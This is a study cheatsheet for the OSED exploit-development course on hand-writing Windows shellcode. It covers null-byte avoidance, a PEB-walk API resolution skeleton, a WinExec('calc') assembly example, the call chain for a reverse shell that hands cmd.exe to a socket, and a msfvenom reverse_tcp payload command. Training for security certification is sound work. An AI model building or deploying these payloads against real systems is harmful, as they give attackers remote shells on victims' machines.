# NASM / Custom Shellcode Cheatsheet

OSED wants you to *write* shellcode, not just msfvenom it. This is the workflow for
hand-rolling position-independent Windows shellcode.

## Assemble & extract bytes
```bash
# Assemble raw:
nasm -f bin sc.asm -o sc.bin

# See the bytes:
objdump -D -b binary -m i386 sc.bin          # disassemble to verify
xxd -i sc.bin                                # C-style array
# One-liner: raw bin -> python bytes
for b in $(xxd -p sc.bin | fold -w2); do printf '\\x%s' $b; done; echo
```
Or use the Kali helper `msf-nasm_shell` for quick "what are the opcodes for this instr":
```
nasm > jmp esp
00000000  FFE4              jmp esp
```

## Rules for exploit-safe shellcode
1. **No null bytes** (`\x00`) — they terminate strings. Avoid instructions that encode
   nulls. Tricks:
   - `mov eax, 0`        → `xor eax, eax`
   - `mov eax, 0x00000005` (has nulls) → `xor eax,eax; mov al, 5`
   - `push 0`            → `xor eax,eax; push eax`
2. **Position independent** — no hardcoded addresses; resolve everything at runtime.
3. **Avoid other badchars** for the specific target (see `badchars.md`).
4. **Preserve/restore** registers you clobber if you need to return cleanly.

## Finding kernel32 / resolving APIs (the core skill)
Windows shellcode resolves API addresses at runtime via the **PEB → loaded modules →
export table** walk. Skeleton:
```
; Get PEB
xor eax, eax
mov eax, [fs:0x30]        ; PEB address
mov eax, [eax+0x0c]       ; PEB->Ldr
mov eax, [eax+0x14]       ; InMemoryOrderModuleList (first entry)
; walk the linked list to find kernel32.dll by name/hash
; then parse its PE export directory to find GetProcAddress / LoadLibraryA
```
Then use **function name hashing** (ror-13 hash) to find exports without embedding
plaintext names (saves space, dodges badchars). Compute hash of "GetProcAddress",
loop exports comparing hashes.

## Minimal call example: WinExec("calc", ...)
```nasm
; resolve WinExec via the PEB walk + hashing (omitted for brevity), then:
xor  eax, eax
push eax                 ; null terminator
push 0x636c6163         ; "calc" reversed -> pushed as 'clac' => 'calc\0'
mov  ecx, esp           ; ecx -> "calc"
xor  edx, edx
push edx                ; uCmdShow = 0
push ecx                ; lpCmdLine
call <WinExec_addr>
```

## Reverse shell shape (windows/shell_reverse_tcp equivalent)
The API call chain you implement by hand:
```
LoadLibraryA("ws2_32.dll")
WSAStartup(...)
WSASocketA(...)              ; create socket
connect(sock, sockaddr_in{AF_INET, port, ip}, ...)
CreateProcessA("cmd.exe", ..., STARTUPINFO{hStdInput=hStdOutput=hStdError=sock})
```
See `03-shellcode/reverse_shell.asm` for the annotated skeleton.

## Debugging your shellcode
- Assemble, load the `.bin` into a tiny loader (VirtualAlloc RWX + copy + call), run
  under WinDbg, `t` through it.
- Watch for the first place a register goes wrong — usually a null-byte substitution or
  a wrong offset in the PEB walk.
- `!py mona compare` your final bytes against the badchar set before trusting it.

## Encoders (when hand-rolling is overkill)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 \
  -f python -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
```
Encoded shellcode is self-decoding — it needs a few hundred bytes of writable+executable
stack *below* itself to unpack. If it corrupts itself, add a stack adjust
(`sub esp, 0x500`) before it, or use mona's decoder-safe alignment.

## Size budget cheat
| Payload | Approx size |
|---|---|
| WinExec calc | ~190–230 bytes |
| reverse shell (staged msf) | ~350–400 bytes |
| reverse shell (stageless) | ~500–700 bytes |
| egghunter | ~32 bytes |
If your space is under the payload size → egghunter to a bigger buffer.
